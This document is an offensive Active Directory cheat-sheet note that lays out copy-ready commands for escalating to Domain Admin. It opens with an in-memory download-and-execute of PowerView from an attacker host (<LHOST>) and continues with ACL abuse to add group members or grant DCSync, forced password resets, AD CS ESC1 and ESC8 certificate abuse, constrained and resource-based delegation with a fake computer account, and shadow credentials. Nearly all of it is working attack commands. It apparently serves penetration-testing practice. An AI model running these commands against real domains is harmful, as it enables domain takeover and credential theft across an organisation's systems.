---
title: AD Privesc To DA
type: note
tab: Active Directory
inputs: [Username, Password, Hash, PFX, Shell]
outputs: [DA, DCSync, TGT, Hash]
tags: [ActiveDirectory, PrivilegeEscalation, Kerberos, SMB, LDAP]
---

# AD Privesc To DA

## WHY

Abuse BloodHound paths, AD CS, delegation, or misconfigurations to reach Domain Admin.

## WHEN

- BloodHound shows ACL abuse path.
- AD CS vulnerable template exists.
- You can create/modify computer accounts.
- You found high-value credentials.

## NEXT

- DA achieved: [[Post-DA]]

## Commands

### ACL Abuse - Add Group Member With PowerView

#Shell #ActiveDirectory #PrivilegeEscalation
Load PowerView, inspect privileged groups, add a user to the target group, and confirm membership.

```powershell
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX
Get-DomainGroup "<GROUP>"
Add-DomainGroupMember -Identity "<GROUP>" -Members <USER>
Get-DomainGroupMember "<GROUP>"
```

### ACL Abuse - Add Group Member With Net RPC

#Username #Password #SMB #ActiveDirectory #PrivilegeEscalation
GenericAll on group with net rpc.

```sh
net rpc group addmem '<GROUP>' '<USER>' -U '<DOMAIN>/<USER>%<PASS>' -S <DC_HOST>
```

### ACL Abuse - Grant DCSync With PowerView

#Shell #ActiveDirectory #PrivilegeEscalation
WriteDACL on domain: grant DCSync rights with PowerView.

```powershell
Add-DomainObjectAcl -TargetIdentity '<DOMAIN_DN>' -PrincipalIdentity '<USER>' -Rights DCSync
```

### ACL Abuse - Grant DCSync With Impacket

#Username #Password #ActiveDirectory #PrivilegeEscalation
WriteDACL on domain with Impacket.

```sh
impacket-dacledit -action write -rights DCSync -principal '<USER>' -target-dn '<DOMAIN_DN>' '<DOMAIN>/<USER>:<PASS>'
```

### ACL Abuse - ForceChangePassword

#Username #Password #ActiveDirectory #PrivilegeEscalation
ForceChangePassword.

```sh
net rpc password '<TARGET_USER>' '<NEW_PASS>' -U '<DOMAIN>/<USER>%<PASS>' -S <DC_HOST>
```

### AD CS ESC1 Certificate Impersonation

#Username #Password #ActiveDirectory #PrivilegeEscalation
Request a certificate as an admin UPN, then authenticate with the issued PFX.

1. Request a certificate impersonating the target admin.

```sh
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn '<ADMIN>@<DOMAIN>' -dc-ip <DC_IP>
```

2. Authenticate with the PFX to get a TGT/hash.

```sh
certipy auth -pfx <ADMIN>.pfx -dc-ip <DC_IP>
```

### AD CS ESC8 NTLM Relay

#NTLM #HTTP #ActiveDirectory #PrivilegeEscalation
ESC8: relay NTLM to AD CS.

```sh
certipy relay -target http://<CA_HOST>/certsrv/ -template <TEMPLATE>
```

### Constrained Delegation

#Username #Hash #Kerberos #ActiveDirectory #PrivilegeEscalation
Constrained delegation: impersonate DA to CIFS.

```sh
impacket-getST -spn cifs/<TARGET_HOST> -impersonate <DA_USER> <DOMAIN>/<USER> -hashes :<NTLM_HASH>
```

### RBCD

#Username #Password #ActiveDirectory #PrivilegeEscalation
Create a fake computer, grant it delegation to the target, then request a service ticket.

1. Add a fake computer account.

```sh
impacket-addcomputer <DOMAIN>/<USER>:<PASS> -computer-name '<FAKE_COMPUTER>$' -computer-pass '<FAKE_PASS>' -dc-ip <DC_IP>
```

2. Set resource-based constrained delegation to the target computer.

```sh
impacket-rbcd -delegate-from '<FAKE_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action write <DOMAIN>/<USER>:<PASS>
```

3. Request a CIFS ticket while impersonating the target admin.

```sh
impacket-getST -spn cifs/<TARGET_HOST> -impersonate <DA_USER> <DOMAIN>/<FAKE_COMPUTER>$:<FAKE_PASS> -dc-ip <DC_IP>
```

### Shadow Credentials

#Username #Password #ActiveDirectory #PrivilegeEscalation
Add shadow credentials to a target account, then authenticate with the generated PFX.

1. Add a shadow credential to the target account.

```sh
certipy shadow add -u '<USER>@<DOMAIN>' -p '<PASS>' -account '<TARGET_USER>' -dc-ip <DC_IP>
```

2. Authenticate using the shadow credential PFX.

```sh
certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>
```

## Priority Order

1. BloodHound obvious edges: GenericAll, WriteDACL, ForceChangePassword, AddMember.
2. AD CS: ESC1/ESC8.
3. Delegation: constrained delegation or RBCD.
4. Shadow Credentials.
5. GPP/SYSVOL passwords.
